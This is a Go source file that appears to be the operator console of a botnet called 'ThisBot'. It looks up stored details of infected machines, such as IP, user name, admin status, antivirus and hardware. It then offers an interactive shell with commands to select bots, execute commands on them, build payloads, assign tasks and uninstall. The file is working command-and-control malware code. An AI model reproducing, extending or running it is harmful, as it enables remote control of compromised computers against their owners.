package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func get_bot_info(botid int64, bot *common.Client) bool {
	// Check if bot in database record
	sqlStr := "select guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where id='" + strconv.FormatInt(botid, 10) + "'"
	err := db1.QueryRow(common.Db, sqlStr).Scan(&bot.Guid, &bot.Ip, &bot.Whoami, &bot.Os, &bot.Installdate, &bot.Isadmin, &bot.Antivirus, &bot.Cpuinfo, &bot.Gpuinfo, &bot.Version, &bot.Lastseen)
	if err != nil {
		return false
	}

	bot.Id = int(botid)
	return true
}

func Panel() {
	// Default user is login and account id is 1
	common.Account = 1

	var command string = ""
	show_banner()
	for {
		fmt.Print("$ ")
		command = utils.ReadFromIO()
		if command == "" {
			continue
		}
		cmdAry := strings.Fields(command)

		switch cmdAry[0] {
		case "select", "s":
			select_handler(cmdAry)
		case "list", "l":
			list_handler()
		case "help", "h":
			help_handler()
		case "cancel", "c":
			cancel_handler(cmdAry)
		case "log":
			log_handler(cmdAry)
		case "exec", "x":
			exec_handler(cmdAry)
		case "clear", "cls":
			clear_handler()
			show_banner()
		case "info":
			info_handler(cmdAry)
		case "mode", "m":
			mode_handler(cmdAry)
		case "build", "b":
			build_handler()
		case "task", "t":
			task_handler(cmdAry)
		case "uninstall", "u":
			uninstall_handler()
		case "exit", "e":
			fmt.Println("[🏴‍☠️] Thanks for using THISBOT panel, bye Σ(っ °Д °;)っ")
			os.Exit(0)
		case "cert":
			cert_handler(cmdAry)
		}
	}
}
